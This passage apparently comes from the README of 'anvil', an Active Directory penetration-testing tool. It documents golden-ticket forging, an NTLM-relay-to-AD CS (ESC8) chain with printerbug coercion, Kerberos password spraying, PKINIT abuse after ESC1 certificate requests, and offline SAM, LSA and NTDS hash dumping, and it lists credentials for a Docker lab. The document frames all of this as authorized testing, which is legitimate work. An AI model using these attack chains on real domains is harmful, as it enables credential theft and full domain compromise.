$ KRB5CCNAME=Administrator.ccache anvil connect --host dc01.lab.local -k -u Administrator -d LAB.LOCAL
```

`-krbtgt`/`-nthash` want the 32-hex-char NT hash (an `LMHASH:NTHASH` pair
is accepted too, the NT half is used). `-domain-sid` is the domain SID
proper (`S-1-5-21-<a>-<b>-<c>`) — a user SID with a trailing RID is
rejected.

**For authorized security testing only** — a forged golden ticket grants
persistent, full domain compromise on any domain you point it at.

### `anvil describe` / `anvil convert`

`anvil describe <file>` prints every ticket in a ccache or kirbi file
(format sniffed by content, not extension): client, service, validity
window (expired tickets flagged), session-key and ticket encryption types,
and decoded flags. Fully offline; no keys needed.

`anvil convert <in> <out>` converts between ccache and kirbi (KRB-CRED),
direction detected from content. All tickets in the file are converted; a
round-tripped ccache remains fully usable with `connect -k`. Conventions
match impacket's ticketConverter (unencrypted KRB-CRED, auth time carried
by start time).

### `anvil relay`

```
anvil relay --ca <CA-NAME> --target <ca-host> [--template t] [--alt-name upn] [--smb-port 445] [--rpc]
```

An NTLM-relay listener that turns a coerced machine-account
authentication into an AD CS certificate (ESC8). gopacket's relay
engine listens for the inbound connection and relays it to the CA's
ICPR endpoint; the issued cert lands as a PFX in the loot directory
(default `~/.anvil/loot/relay/`) and is converted to the PEM layout
`gettgt --cert` reads. The operator's chain: relay here, then
`coerce printerbug <this-ip> 445` from a `connect` shell — the DC's
machine account calls back, the relayed auth requests a Machine cert,
and `gettgt --cert <pem> -d <domain>` completes it. The SMB listener
needs `:445` free on the relay box (the Windows SMB service must be
stopped, or run the relay from Linux). The command exits after the
first capture or `--wait` (default 10m).

### `anvil userenum` / `anvil spray`

```
anvil userenum -d <dns-domain> --dc-ip <ip> -u <users.txt> [--out file]
anvil spray -d <dns-domain> --dc-ip <ip> -u <users.txt> -p <password> [--delay 2s] [--stop-on-success N]
```

Kerberos-only account discovery and password spraying — no SMB, so no
per-failure 4625 log noise. `userenum` answers each user with one bare
AS-REQ: VALID (pre-auth required), VALID_NOPREAUTH (roastable), INVALID,
or LOCKED; the exchange touches no account state. `spray` tries ONE
password against every user in the file and aborts immediately with a
loud warning the moment any attempt returns a lockout verdict — targets
with a lockout threshold would otherwise have accounts locked by the
run. User files are one name per line.

### `anvil gettgt`

```
anvil gettgt -u <user> -d <dns-domain> [-p <password> | --hashes <LM:NT>] [--dc-ip <ip>] [-out <path>]
anvil gettgt --cert <pem> [-u <user>] -d <dns-domain> [--dc-ip <ip>] [-out <path>]
```

Mints a TGT into a ccache for `connect -k`, without leaving the tool:
the AS exchange runs over TCP/88 with RC4-HMAC keys derived from the
password or the NT hash. Same impacket-style single-dash flags as
`ticket`/`getst`.

With `--cert <pem>` the exchange is PKINIT (RFC 4556, Diffie-Hellman
mode — the form modern Windows KDCs accept; RSA mode is rejected on
hardened KDCs because its 3DES reply encryption is unavailable): the
file holds an issued client certificate and its RSA private key as one
PEM — exactly the layout `certreq -out` writes, with no password and
no PKCS#12 conversion needed. The client principal defaults to the
certificate's SAN UPN, else the subject CN; `-u` overrides. This is
the ESC1 follow-through kept in-tool: `adenum adcs` flags a vulnerable
template, `certreq <template> -san victim@corp.local` gets the cert
issued, `gettgt --cert` turns it into a TGT, and `connect -k` rides
the resulting ccache. A KDC with no trust for the certificate denies
the exchange with a themed error and writes no ccache (Samba's lab KDC
always does — e2e asserts that denial).

### Offline dumps: `anvil samdump` / `anvil lsadump` / `anvil ntdsdump`

```
anvil samdump --system <hive> --sam <hive>
anvil lsadump --system <hive> --security <hive>
anvil ntdsdump --system <hive> --ntds <dit>
```

The same parsers the live `connect` dumps use, run offline on hives you
already hold (pulled by any tool). Output format is identical to the
live path — secretsdump lines, LSA SECRETS + CACHED LOGONS sections, and
the ESE-flush caveat note for NTDS.

## Test lab (Docker)

A self-contained Samba AD DC (`dc01.lab.local`, realm `LAB.LOCAL`) runs in
Docker as an independent test target for `anvil scan` and `anvil connect`.
It is **Samba, not Windows Server** — protocol behavior and defaults differ
from real AD in places (e.g. anonymous session setup is allowed by default),
so treat it as a smoke-test target, not a fidelity reference.

Requires Docker Desktop with Linux containers. From Git Bash you may need
Docker's bin dir on PATH first:

```
export PATH="$PATH:/c/Program Files/Docker/Docker/resources/bin"
```

Usage:

```
make env-up      # build image (first run) + start dc, provision domain
make e2e         # build dist/anvil-linux-amd64, run the assertion suite
make env-logs    # follow dc logs
make env-down    # stop and wipe all volumes (fresh provision next time)
```

What `make e2e` covers (assertions in `testenv/scripts/e2e.sh`): port scan
of the AD set, SMB dialect/signing fingerprint, LDAP root DSE naming context,
RPC endpoint dump, DC hint; `connect` with alice's password (share list,
ls/cd/pwd, `get` round-trips incl. a `..\hello.txt` parent path, `put`
verified from the runner side); pass-the-hash with alice's NT hash; null
session handling. Lab credentials: `LAB\alice` / `AlicePass#2026`, admin
`Lab!Admin#2026`; share `LABSHARE` with seeded files.

The DC also publishes SMB/LDAP on host ports `4445`/`4389` for manual
poking, e.g. `anvil connect --host 127.0.0.1 --port 4445 -u alice -p
'AlicePass#2026' -d LAB`. (`anvil scan` probes fixed service ports, so
scan the lab from inside Docker — that's what `make e2e` does.)

## License

anvil is released under the terms of its [LICENSE](LICENSE); see
[NOTICE](NOTICE) for third-party attribution, including the gopacket
project (Apache-2.0) this tool is built on.

**For authorized security testing only.** Use of this tool against systems
without explicit permission is illegal in most jurisdictions. The authors
assume no liability for misuse.
